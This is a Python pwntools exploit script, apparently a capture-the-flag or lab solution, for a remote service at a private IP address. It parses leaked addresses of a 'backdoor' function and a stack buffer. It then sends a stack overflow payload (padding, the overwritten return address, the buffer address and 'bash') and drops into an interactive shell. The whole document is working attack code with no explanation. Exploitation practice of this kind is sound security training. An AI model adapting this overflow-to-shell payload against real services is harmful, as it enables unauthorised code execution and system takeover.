from pwn import *

# context.terminal = ['tmux', 'split', '-h']   # for debug
# context.log_level = 'debug'

#p = process('./hack')     # use this tube on your local machine
p = remote('10.20.38.233', 23454)   # use this for remote attack

p.recvuntil('cheater1: 0x')
bdoor = int(p.recvline(), 16)
p.info('backdoor address: 0x%x', bdoor)

#print(bdoor)
#print(type(bdoor))
p.recvuntil('cheater2: 0x')
addr = int(p.recvline(), 16)
p.info('local buf address: 0x%x', addr)

p.recvuntil('name? ')
return_addr = ""
while bdoor != 0:
    return_addr = return_addr + chr(bdoor % 256)
    bdoor = math.floor(bdoor / 256)
buf_addr = ""
addr += 14 * 4
while addr != 0:
    buf_addr = buf_addr + chr(addr % 256)
    addr = math.floor(addr / 256)

payload = "0000111122223333444455556666777788889999aaaa" + return_addr + "bbbb" + buf_addr + "bash" + chr(0)

#gdb.attach(p, 'finish\n'*6)     # for debug, use tmux or byobu

p.sendline(payload)

# set control to the terminal
p.interactive()
